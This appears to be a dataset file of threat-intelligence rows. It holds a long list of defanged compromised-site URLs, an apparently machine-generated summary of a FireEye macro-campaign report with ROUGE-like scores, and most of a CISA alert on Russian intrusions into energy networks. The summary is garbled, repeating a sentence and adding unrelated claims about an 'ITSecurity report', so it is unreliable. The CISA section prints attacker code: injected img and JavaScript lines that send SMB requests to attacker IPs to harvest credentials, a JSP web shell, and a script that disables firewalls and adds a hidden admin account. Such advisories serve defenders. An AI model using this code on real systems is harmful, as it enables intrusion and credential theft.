/alexanderbecker[.]net/services/db_template.phphxxp://visionclinic.co.ls/visionclinic/db_template.phphxxps://www.angelesrevista[.]com//db_template.phphxxps://www.antojoentucocina[.]com//db_template.phphxxp://apollonweb[.]com//db_template.phphxxps://www.alphapixa[.]com//db_template.phphxxp://capitalradiopetition[.]co.za//db_template.phphxxp://www.generictoners[.]co.za//db_template.phphxxps://alnahdatraining[.]com//db_template.phphxxps://albousala[.]com//db_template.phphxxps://www.dopetroleum[.]com//db_template.phphxxp://bios-chip[.]co.za//db_template.phphxxp://www.crissamconsulting[.]co.za//db_template.phphxxp://capriflower[.]co.za//db_template.phphxxp://www.dingaanassociates[.]co.za//db_template.phphxxp://indiba-africa[.]co.za//db_template.phphxxp://verifiedseller[.]co.za/js/db_template.phphxxps://www.buraqlubricant[.]com//db_template.phphxxp://aqarco[.]com/wp-admin/db_template.phphxxp://allaboutblockchain[.]net//db_template.phphxxp://www.amexcars[.]info/tpl/db_template.phphxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.phphxxp://bakron[.]co.za//db_template.phphxxp://gsnconsulting[.]co.za//db_template.phphxxp://vumavaluations[.]co.za//db_template.phphxxp://heritagetravelmw[.]com//db_template.phphxxp://ampvita[.]com//db_template.phphxxp://ahero-resource-center[.]org/administrator/db_template.phphxxps://arbulario[.]com//db_template.phphxxp://havilahglo[.]co.za/wpscripts/db_template.phphxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.phphxxp://delectronics[.]com[.]pk//db_template.phphxxp://antucomp[.]com//db_template.phphxxp://advocatetn[.]com/font-awesome/fonts/db_template.phphxxps://amooy[.]com/webservice/db_template.phphxxp://www.harmonyguesthouse[.]co.za//db_template.phphxxp://alanrori[.]com//db_template.phphxxp://algarvesup[.]com//db_template.phphxxp://desirablehair[.]co.za//db_template.phphxxp://comsip[.]org.mw//db_template.phphxxp://jdcorporate[.]co.za/catalog/db_template.phphxxp://andrewfinnburhoe[.]com//db_template.phphxxp://anyeva[.]com/wp-includes/db_template.phphxxp://www.agenceuhd[.]com//db_template.phphxxp://host4unix[.]net/host24new/db_template.phphxxp://www.altaica[.]ca/wordpress/db_template.phphxxp://www.allbuyer[.]co[.]uk//db_template.phphxxp://jvpsfunerals[.]co.za//db_template.phphxxp://immaculatepainters[.]co.za//db_template.phphxxp://tcpbereka[.]co.za/js/db_template.phphxxp://clientcare.co.ls//db_template.phphxxp://investaholdings[.]co.za/htc/db_template.phphxxp://www.amjobs[.]co[.]uk//db_template.phphxxp://www.agirlgonewine[.]com/store/db_template.phphxxp://findinfo-more[.]com//db_template.phphxxp://asgen[.]org//db_template.phphxxp://alphasalesrecruitment[.]com//db_template.phphxxp://irshadfoundation[.]co.za//db_template.phphxxp://analternatif[.]com/includes/db_template.phphxxp://arbruisseau[.]com/profiles/db_template.phphxxp://ladiescircle[.]co.za//db_template.phphxxp://all-reseller[.]com/zzz_backup/db_template.phphxxp://alcatrazmoon[.]com/images/db_template.phphxxp://www.alcalumni[.]com/wp-includes/db_template.phphxxp://aniljoseph[.]com/servermon/db_template.phphxxp://alwake3press[.]com/wp-includes/db_template.phphxxp://www.hfhl[.]org.ls/habitat/db_template.phphxxp://alcafricanos[.]com/slsmonographs/db_template.phphxxps://agapeencounter[.]org//db_template.phphxxp://apobiomedix[.]ca//db_template.phphxxp://anythinglah[.]info//db_template.phphxxp://aniroleplay[.]net//db_template.phphxxp://www.allcopytoners[.]com//db_template.phphxxp://alphaobring[.]com//db_template.phphxxp://www.galwayprimary[.]co.za//db_template.phphxxp://alnuzha[.]org/en/db_template.phphxxps://ancient-wisdoms[.]com//db_template.phphxxp://amazingenergysavings[.]net//db_template.phphxxp://gvs[.]com[.]pk/font-awesome/db_template.phphxxp://geetransfers[.]co.za/font-awesome/db_template.phphxxp://carlagrobler[.]co.za/components/db_template.phphxxp://amazingashwini[.]com//db_template.phphxxp://aminearserver[.]es//db_template.phphxxp://lensofafrica[.]co.za//db_template.phphxxp://greenacrestf[.]co.za/video/db_template.phphxxp://www.tonaro[.]co.za//db_template.phphxxp://alephit2[.]biz/kitzz/db_template.phphxxp://lppaportal[.]org.ls//db_template.phphxxp://alkousy[.]com//db_template.phphxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.phphxxp://fragranceoil[.]co.za//db_template.phphxxp://www.eloquent[.]co.za/nweb2/db_template.phphxxp://chrishanicdc[.]org/wpimages/db_template.phphxxp://ahc.me[.]uk//db_template.phphxxp://www.britishasia-equip[.]co[.]uk//db_template.phphxxp://always-beauty[.]ch//db_template.phphxxps://www.ancamamara[.]com/wp-admin/db_template.phphxxp://entracorntrading[.]co.za//db_template.phphxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.phphxxp://americabr[.]com.br//db_template.phphxxp://andrew-snyder[.]net/bootstrap/db_template.phphxxp://signsoftime[.]co.za//db_template.phphxxp://aperta-armis[.]org//db_template.phphxxp://absfinancialplanning[.]co.za/images/db_template.phphxxp://charispaarl[.]co.za//db_template.phphxxp://indlovusecurity[.]co.za//db_template.phphxxp://alcafricandatalab[.]com//db_template.phphxxp://amor-clubhotels[.]com//db_template.phphxxp://mokorotlocorporate[.]com//db_template.phphxxp://apppriori[.]com//db_template.phphxxp://luxconprojects[.]co.za//db_template.phphxxp://androidphonetips[.]com/wp-includes/db_template.phphxxp://angel-seeds[.]com.ua/catalog/db_template.phphxxp://alissanicolai[.]com/assets/db_template.phphxxps://www.amateurastronomy[.]org//db_template.phphxxp://aiofotoevideo[.]com//db_template.phphxxp://www.amika.hr//db_template.phphxxp://comfortex[.]co.za/php/db_template.phphxxp://deepgraphics[.]co.za//db_template.phphxxps://agiledepot[.]com//db_template.phphxxp://almatours[.]gr//db_template.phphxxp://analystcnwang[.]com//db_template.phphxxp://www.malboer[.]co.za/trendy1/db_template.phphxxp://sefikengfarm.co.ls//db_template.phphxxp://www.antirughenaturale[.]com/wp-admin/db_template.phphxxp://passright[.]co.za//db_template.phphxxp://seismicfactory[.]co.za//db_template.phphxxp://alessandroalessandrini[.]it//db_template.phphxxps://aquabsafe[.]com//db_template.phphxxp://amatikulutours[.]com/tmp/db_template.phphxxp://ganitis[.]gr//db_template.phphxxp://aleenasgiftbox[.]com/admin/db_template.phphxxps://allusdoctors[.]com/themes/db_template.phphxxp://alainsaffel[.]com//db_template.phphxxp://www.ariehandomri[.]com//db_template.phphxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.phphxxp://itengineering[.]co.za/gatewaydiamond/db_template.phphxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.phphxxp://www.albertamechanical[.]ca//db_template.phphxxp://alchamel[.]info//db_template.phphxxps://almokan[.]net/wp-includes/db_template.phphxxp://jakobieducation[.]co.za//db_template.phphxxps://arc-sec[.]net//db_template.phphxxp://ldams[.]org.ls/supplies/db_template.phphxxp://menaboracks[.]co.za/tmp/db_template.phphxxp://www.getcord[.]co.za//db_template.phphxxp://boardaffairs[.]com//db_template.phphxxp://capetownway[.]co.za//db_template.phphxxp://cloudhostdesign[.]com//db_template.phphxxp://hartenboswaterpark[.]co.za/templates/db_template.phphxxp://fccorp[.]co.za/php/db_template.phphxxp://angar68[.]com//db_template.phphxxp://www.dws-gov[.]co.za//db_template.phphxxp://alwahahweb[.]com//db_template.phphxxp://anuragcreatives[.]com//db_template.phphxxp://embali[.]co.za//db_template.phphxxp://albertaedmonton[.]com/widgetstyles/db_template.phphxxp://altosdefontana[.]com//db_template.phphxxp://airfanhydro[.]net//db_template.phphxxps://www.alexponcet[.]com/wp-includes/db_template.phphxxp://agropecuariavilarica[.]com.br//db_template.phphxxps://www.amazingbuyrd[.]com/admin/db_template.phphxxp://cdxtrading[.]co.za//db_template.phphxxp://interafricaconsulting[.]com/wpimages/db_template.phphxxp://glgroup[.]co.za/images/db_template.phphxxp://hisandherskennels[.]co.za/php/db_template.phphxxp://alemaohost[.]com/lotosorg[.]com/db_template.phphxxp://isibaniedu[.]co.za/admin/db_template.phphxxp://dianakleyn[.]co.za/layouts/db_template.phphxxp://themotoringcalendar[.]co.za//db_template.phphxxp://www.loansonhomes[.]co.za//db_template.phphxxp://edgesecurity[.]co.za/js/db_template.phphxxp://highschoolsuperstar[.]co.za/files/db_template.phphxxp://www.ambientproperty[.]com//db_template.phphxxp://animationshowreel[.]co.il//db_template.phphxxp://cafawelding[.]co.za/font-awesome/db_template.phphxxp://apalawyers.pt//db_template.phphxxp://www.edesignz[.]co.za//db_template.phphxxp://centuryacademy[.]co.za/css/db_template.phphxxps://ambyenta.hr//db_template.phphxxp://ceramica[.]co.za//db_template.phphxxp://www.alfredoposada[.]com//db_template.phphxxp://anastasovsworkshop[.]com/wp-includes/db_template.phphxxp://allisonplumbing[.]com/wp-includes/db_template.phphxxp://eastrandmotorlab[.]co.za/fleet/db_template.phphxxp://angelsongroup[.]com/wp-includes/db_template.phphxxp://www.mikimaths[.]com//db_template.phphxxp://hjb-racing[.]co.za/htdocs/db_template.phphxxp://anotherpartofme[.]com/wp-includes/db_template.phphxxp://www.andreabelfi[.]com//db_template.phphxxp://www.iancullen[.]co.za//db_template.phphxxp://alaskamaterials[.]com//db_template.phphxxp://jeanetteproperties[.]co.za//db_template.phphxxp://www.digitalmedia[.]co.za//db_template.phphxxp://www.rejoicetheatre[.]com//db_template.phphxxps://alterwebhost[.]com//db_template.phphxxp://bc-u[.]co[.]uk//db_template.phphxxp://dpscdgkhan.edu[.]pk/shopping/db_template.phphxxp://edgeforensic[.]co.za//db_template.phphxxp://willpowerpos[.]co.za//db_template.phphxxp://antrismode[.]com/wp-includes/db_template.phphxxp://colenesphotography[.]co.za/modules/db_template.phphxxp://anthaigroup.vn//db_template.phphxxps://alphainvestors[.]com.au//db_template.phphxxps://aliart[.]nl//db_template.phphxxps://allmantravel[.]com/thumbs/db_template.phphxxp://fbrvolume[.]co.za//db_template.phphxxp://amordegato[.]es/storefront/db_template.phphxxp://agylub[.]com//db_template.phphxxp://www.khotsonglodge.co.ls//db_template.phphxxp://ampli5yd[.]com//db_template.phphxxps://animeok[.]co.il//db_template.phphxxps://arbeidsrechtcentrum[.]nl//db_template.phphxxp://erniecommunications[.]co.za/js/db_template.phphxxp://promechtransport[.]co.za/scripts/db_template.phphxxp://centuriongsd[.]co.za//db_template.phphxxp://www.agencesylvieleclerc[.]com//db_template.phphxxp://delcom[.]co.za//db_template.phphxxps://aleoestudio[.]com/gallonature/db_template.phphxxp://oftheearthphotography[.]com/www/db_template.phphxxp://h-dubepromotions[.]co.za//db_template.phphxxp://www.alessioborzuola[.]com/downloads/db_template.phphxxp://crystaltidings[.]co.za//db_template.phphxxp://funeralbusinesssolution[.]com/email_template/db_template.phphxxp://funisalodge[.]co.za/data1/db_template.phphxxp://experttutors[.]co.za//db_template.phphxxps://www[.]cartridgecave[.]co.za//db_template.phphxxp://ecs-consult[.]com//db_template.phphxxp://www.animationinisrael[.]org/tmp_images/db_template.phphxxp://gideonitesprojects[.]com//db_template.phphxxp://hybridauto[.]co.za/photography/db_template.phphxxp://africanpixels.zar.cc//db_template.phphxxp://ryanchristiefurniture[.]co.za//db_template.phphxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.phphxxp://almeriahotelja[.]com/dk/db_template.phphxxp://al3abflash[.]biz//db_template.phphxxp://www.fun4kidz[.]co.za//db_template.phphxxp://alsharhanstore[.]com//db_template.phphxxp://www[.]infratechconsulting[.]com//db_template.phphxxp://algihad[.]com/assets/db_template.phphxxp://americanwestmedia[.]com//db_template.phphxxp://charliewestsecurity[.]co.za//db_template.phphxxp://beehiveholdingszar[.]co.za//db_template.phphxxp://analyticalfootball[.]com//db_template.phphxxp://apiiination[.]com/leadership/db_template.phphxxps://ahelicoptermom[.]com/wp-includes/db_template.phphxxp://servicebox[.]co.za//db_template.phphxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.phphxxps://aquo[.]in//db_template.phphxxps://www.alfransia[.]com/wp-admin/db_template.phphxxp://www.icsswaziland[.]com//db_template.phphxxp://aiko.pro//db_template.phphxxps://alceharfield[.]com//db_template.phphxxp://indocraft[.]co.za/test/db_template.phphxxp://allegiancesecurity[.]org//db_template.phphxxp://sullivanprimary[.]co.za//db_template.phphxxp://www.apmequestrian[.]com//db_template.phphxxps://alphawaves[.]org/wp-admin/db_template.phphxxp://www.alexandrasternin[.]com/illustration/db_template.phphxxp://www.daleth[.]co.za//db_template.phphxxp://jwseshowe[.]co.za/assets/db_template.phphxxp://winagainstebola[.]com//db_template.phphxxp://anubandh[.]in//db_template.phphxxp://www.alexanderhomestead[.]com//db_template.phphxxp://alfatek-intelligence[.]com//db_template.phphxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.phphxxp://alorabrownies[.]com/wp-admin/db_template.phphxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.phphxxp://cazochem[.]co.za/cazochem/db_template.phphxxp://debnoch[.]com/image/db_template.phphxxp://hmholdings360[.]co.za//db_template.phphxxp://iinvest4u[.]co.za//db_template.phphxxp://burgercoetzeeattorneys[.]co.za//db_template.phphxxp://anngrigphoto[.]com//db_template.phphxxp://alchemistasonida[.]com//db_template.phphxxp://anahera[.]biz/admin/db_template.phphxxp://h-u-i[.]co.za/heiren/db_template.phphxxp://insta-art[.]co.za//db_template.phphxxp://muallematsela[.]com//db_template.phphxxp://aguasdecastilla[.]com/uploads/db_template.phphxxp://www.arabgamenetwork[.]com//db_template.phphxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.phphxxp://amruthavana[.]com/blog/db_template.phphxxp://digitalblue[.]co.za//db_template.phphxxps://www.alvarezarquitectos[.]com//db_template.phphxxp://buboobioinnovations[.]co.za/wpimages/db_template.phphxxp://andrewsbisom[.]com//db_template.phphxxp://www.m-3[.]co.za//db_template.phphxxp://beesrenovations[.]co.za/images/db_template.phphxxps://www.apliety[.]co.il/wp-includes/db_template.phphxxp://alchamelup[.]org/htdocs/db_template.phphxxp://benonicoc[.]co.za/resources/db_template.phphxxps://al-mostakbl[.]com//db_template.phphxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.phphxxp://andrespazsoldan[.]com//db_template.phphxxp://in2accounting[.]co.za//db_template.phphxxp://aipa[.]ca//db_template.phphxxp://alphabee.fund/PHPMailer_5.2.0/db_template.phphxxp://arabsdeals[.]com//db_template.phphxxps://archiotronic[.]com/wp-includes/db_template.phphxxp://capewindstrading[.]co.za//db_template.phphxxps://althurayaa[.]com//db_template.phphxxp://jhphotoedits[.]co.za//db_template.phphxxp://cloudhub.co.ls/modules/db_template.phphxxp://apironco[.]com/wp-includes/db_template.phphxxp://digital-cameras-south-africa[.]co.za/script/db_template.phphxxp://ahmadhasanat[.]com//db_template.phphxxp://alexrocchi[.]com//db_template.phphxxp://aljaadi[.]com//db_template.phphxxps://www.engeltjieakademie[.]co.za//db_template.phphxxp://annabelle[.]nl/next/db_template.phphxxp://juniorad[.]co.za/vendor/db_template.phphxxp://animationpulse[.]net//db_template.phphxxp://angloglot[.]com//db_template.phphxxp://agricolavicuna.cl//db_template.phphxxp://alexelgy[.]com/allaccess/db_template.phphxxp://www.centreforgovernance[.]uk//db_template.phphxxp://www.aliandconsulting[.]com//db_template.phphxxp://balaateen[.]co.za/less/db_template.phphxxp://aleksicdunja[.]com//db_template.phphxxp://arestihome[.]com//db_template.phphxxp://am1int.fcomet[.]com/wp1/db_template.phphxxp://anet-international-group[.]com/shop/db_template.phphxxp://courtesydriving[.]co.za/js/db_template.phphxxp://annaplebanek[.]com//db_template.phphxxp://agencijazemil[.]com//db_template.phphxxp://airminumtiro[.]com//db_template.phphxxp://www.androidwikihow[.]com//db_template.phphxxp://alisabyfinna[.]com//db_template.phphxxp://rma-law[.]co.za//db_template.phphxxp://amari[.]ro/components/db_template.phphxxp://anxiousandunstoppable[.]com//db_template.phphxxp://www.buhlebayoacademy[.]com//db_template.phphxxp://arabellajo[.]com/wp/wp-includes/db_template.phphxxp://blackthorn[.]co.za//db_template.phphxxp://alaqaba[.]com/dnsarabia[.]com/db_template.phphxxp://airesis.blog/wp-admin/db_template.phphxxp://www.aptibet[.]org//db_template.phphxxp://alecattic[.]com/wp-includes/db_template.phphxxp://anglero[.]com//db_template.phphxxp://getabletravel[.]co.za/wpscripts/db_template.phphxxp://www";"FireEye observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macrobased documents to individuals in Asia and the Middle East from January 2018 to March 2018. The threat actor's tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. In this spear phishing campaign, the threat actor's tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. A brief timeline of this activity is shown in Figure 1. The first part of the campaign (From Jan. 23, 2018, to Feb. 26, 2018) used a macrobased document that dropped a VBS file and an INI file. The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe. The process chain is shown in Figure 2. Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it. One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3. The second part of the campaign (from Feb. 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution. The ITSecurity report found that the threat group TEMP.Zagros was using a new variant of the macro that does not use VBS for PowerShell code execution. Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog. The threat group TEMP.Zagros has weaponized their malware by dropping three files, Defender.sct, DefenderService.inf, and WindowsDefender.ini, in a hard coded path, C:\programdata. Additionally, the macro will set a registry key to achieve persistence, ""WindowsDefenderUpdater"" = cmstp.exe /s c:\programdata\DefenderService.inf. Upon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file. The ITSecurity report states that the WindowsDefender.ini file contains a malicious PowerShell script. The PowerShell script employs several layers of obfuscation to hide its actual functionality. In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools. Some of the key obfuscation techniques used are: Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult. PowerShell Environment Variables: Nowadays, malware authors commonly mask critical strings such as ""IEX"" using environment variables. The response from the PowerShell script is as shown in Figure 15.Figure 15: Response from PowerShell script The ITSecurity report highlights the need for improved security measures in order to protect the company's IT infrastructure. The report outlines the current security measures in place, as well as the potential risks and vulnerabilities. The report also provides recommendations on how to improve the security of the company's IT infrastructure.";en;{'r': 0.16766917293233083, 'p': 0.861003861003861, 'f': 0.28067967002159677};{'r': 0.1353258613532586, 'p': 0.7375565610859729, 'f': 0.22869168450736393};{'r': 0.1661654135338346, 'p': 0.8532818532818532, 'f': 0.2781623635395326}
https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical;Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors;"Systems AffectedDomain ControllersFile ServersEmail ServersOverviewThis joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on Russian government actions targeting U.S. Government entities as well as organizations in the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors. It also contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by Russian government cyber actors on compromised victim networks. DHS and FBI produced this alert to educate network defenders to enhance their ability to identify and reduce exposure to malicious activity.DHS and FBI characterize this activity as a multi-stage intrusion campaign by Russian government cyber actors who targeted small commercial facilities' networks where they staged malware, conducted spear phishing, and gained remote access into energy sector networks. After obtaining access, the Russian government cyber actors conducted network reconnaissance, moved laterally, and collected information pertaining to Industrial Control Systems (ICS).For a downloadable copy of IOC packages and associated files, see:Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.Since at least March 2016, Russian government cyber actors--hereafter referred to as ""threat actors""--targeted government entities and multiple U.S. critical infrastructure sectors, including the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors.Analysis by DHS and FBI, resulted in the identification of distinct indicators and behaviors related to this activity. Of note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. [1]This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third-party suppliers with less secure networks, referred to as ""staging targets"" throughout this alert. The threat actors used the staging targets' networks as pivot points and malware repositories when targeting their final intended victims. NCCIC and FBI judge the ultimate objective of the actors is to compromise organizational networks, also referred to as the ""intended target.""Technical DetailsThe threat actors in this campaign employed a variety of TTPs, includingspear-phishing emails (from compromised legitimate account),watering-hole domains,credential gathering,open-source and network reconnaissance,host-based exploitation, andtargeting industrial control system (ICS) infrastructure.Using Cyber Kill Chain for AnalysisDHS used the Lockheed-Martin Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of threat actors' activities within this framework.Stage 1: ReconnaissanceThe threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. DHS analysis identified the threat actors accessing publicly available information hosted by organization-monitored networks during the reconnaissance phase. Based on forensic analysis, DHS assesses the threat actors sought information on network and organizational design and control system capabilities within organizations. These tactics are commonly used to collect the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publicly accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.Analysis also revealed that the threat actors used compromised staging targets to download the source code for several intended targets' websites. Additionally, the threat actors attempted to remotely access infrastructure such as corporate web-based email and virtual private network (VPN) connections.Stage 2: WeaponizationSpear-Phishing Email TTPsThroughout the spear-phishing campaign, the threat actors used email attachments to leverage legitimate Microsoft Office functions for retrieving a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//<remote IP address>/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user's credential hash to the remote server before retrieving the requested file. (Note: transfer of credentials can occur even if the file is not retrieved.) After obtaining a credential hash, the threat actors can use password-cracking techniques to obtain the plaintext password. With valid credentials, the threat actors are able to masquerade as authorized users in environments that use single-factor authentication. [2]Use of Watering Hole DomainsOne of the threat actors' primary uses for staging targets was to develop watering holes. Threat actors compromised the infrastructure of trusted organizations to reach intended targets. [3] Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure. Although these watering holes may host legitimate content developed by reputable organizations, the threat actors altered websites to contain and reference malicious content. The threat actors used legitimate credentials to access and directly modify the website content. The threat actors modified these websites by altering JavaScript and PHP files to request a file icon using SMB from an IP address controlled by the threat actors. This request accomplishes a similar technique observed in the spear-phishing documents for credential harvesting. In one instance, the threat actors added a line of code into the file ""header.php"", a legitimate PHP file that carried out the redirected traffic.<img src=""file[:]//62.8.193[.]206/main_logo.png"" style=""height: 1px, width: 1px,"" />In another instance, the threat actors modified the JavaScript file, ""modernizr.js"", a legitimate JavaScript library used by the website to detect various aspects of the user's browser. The file was modified to contain the contents below:var i = document.createElement(""img""), i.src = ""file[:]//184.154.150[.]66/ame_icon.png"", i.width = 3, i.height=2,Stage 3: DeliveryWhen compromising staging target networks, the threat actors used spear-phishing emails that differed from previously reported TTPs. The spear-phishing emails used a generic contract agreement theme (with the subject line ""AGREEMENT & Confidential"") and contained a generic PDF document titled ``document.pdf. (Note the inclusion of two single back ticks at the beginning of the attachment name.) The PDF was not malicious and did not contain any active code. The document contained a shortened URL that, when clicked, led users to a website that prompted the user for email address and password. (Note: no code within the PDF initiated a download.)In previous reporting, DHS and FBI noted that all of these spear-phishing emails referred to control systems or process control systems. The threat actors continued using these themes specifically against intended target organizations. Email messages included references to common industrial control equipment and protocols. The emails used malicious Microsoft Word attachments that appeared to be legitimate resumes or curricula vitae (CVs) for industrial control systems personnel, and invitations and policy documents to entice the user to open the attachment.Stage 4: ExploitationThe threat actors used distinct and unusual TTPs in the phishing campaign directed at staging targets. Emails contained successive redirects to http://bit[.]ly/2m0x8IH link, which redirected to http://tinyurl[.]com/h3sdqck link, which redirected to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained input fields for an email address and password mimicking a login page for a website.When exploiting the intended targets, the threat actors used malicious .docx files to capture user credentials. The documents retrieved a file through a ""file://"" connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139. This connection is made to a command and control (C2) server--either a server owned by the threat actors or that of a victim. When a user attempted to authenticate to the domain, the C2 server was provided with the hash of the password. Local users received a graphical user interface (GUI) prompt to enter a username and password, and the C2 received this information over TCP ports 445 or 139. (Note: a file transfer is not necessary for a loss of credential information.) Symantec's report associates this behavior to the Dragonfly threat actors in this campaign. [1]Stage 5: InstallationThe threat actors leveraged compromised credentials to access victims' networks where multi-factor authentication was not used. [4] To maintain persistence, the threat actors created local administrator accounts within staging targets and placed malicious files within intended targets.Establishing Local AccountsThe threat actors used scripts to create local administrator accounts disguised as legitimate backup accounts. The initial script ""symantec_help.jsp"" contained a one-line reference to a malicious script designed to create the local administrator account and manipulate the firewall for remote access. The script was located in ""C:\Program Files (x86)\Symantec\Symantec Endpoint Protection Manager\tomcat\webapps\ROOT\"".Contents of symantec_help.jsp<% Runtime.getRuntime().exec(""cmd /C \"""" + System.getProperty(""user.dir"") + ""\\..\\webapps\\ROOT\\<enu.cmd>\""""), %>The script ""enu.cmd"" created an administrator account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group to gain elevated privileges. This script contained hard-coded values for the group name ""administrator"" in Spanish, Italian, German, French, and English.Contents of enu.cmdnetsh firewall set opmode disablenetsh advfirewall set allprofiles state offreg add ""HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List"" /v 3389:TCP /t REG_SZ /d ""3389:TCP:*:Enabled:Remote Desktop"" /freg add ""HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\GloballyOpenPorts\List"" /v 3389:TCP /t REG_SZ /d ""3389:TCP:*:Enabled:Remote Desktop"" /freg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /freg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /freg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core"" /v EnableConcurrentSessions /t REG_DWORD /d 1 /freg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v EnableConcurrentSessions /t REG_DWORD /d 1 /freg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /freg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"" /v MaxInstanceCount /t REG_DWORD /d 100 /fnet user MS_BACKUP <Redacted_Password> /addnet localgroup Administrators /add MS_BACKUPnet localgroup Administradores /add MS_BACKUPnet localgroup Amministratori /add MS_BACKUPnet localgroup Administratoren /add MS_BACKUPnet localgroup Administrateurs /add MS_BACKUPnet localgroup ""Remote Desktop Users"" /add MS_BACKUPnet user MS_BACKUP /expires:neverreg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"" /v MS_BACKUP /t REG_DWORD /d 0 /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /freg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fsc config termservice start= autonet start termserviceDHS observed the threat actors using this and similar scripts to create multiple accounts within staging target networks. Each account created by the threat actors served a specific purpose in their operation. These purposes ranged from the creation of additional accounts to cleanup of activity. DHS and FBI observed the following actions taken after the creation of these local accounts:Account 1: Account 1 was named to mimic backup services of the staging target. This account was created by the malicious script described earlier. The threat actor used this account to conduct open-source reconnaissance and remotely access intended targets.Account 2: Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.Account 3: Account 3 was created within the staging victim's Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).Account 4: In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete logs and cover tracks.Scheduled TaskIn addition, the threat actors created a scheduled task named reset, which was designed to automatically log out of their newly created account every eight hours.VPN SoftwareAfter achieving access to staging targets, the threat actors installed tools to carry out operations against intended victims. On one occasion, threat actors installed the free version of FortiClient, which they presumably used as a VPN client to connect to intended target networks.Password Cracking ToolsConsistent with the perceived goal of credential harvesting, the threat actors dropped and executed open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the actor was accessing the system. Of note, the threat actors installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\Users\<Redacted Username>\Desktop\OWAExchange\.DownloaderOnce inside of an intended target's network, the threat actor downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.The files were renamed to new extensions, with INST.txt being renamed INST.exe.The files were executed on the host and then immediately 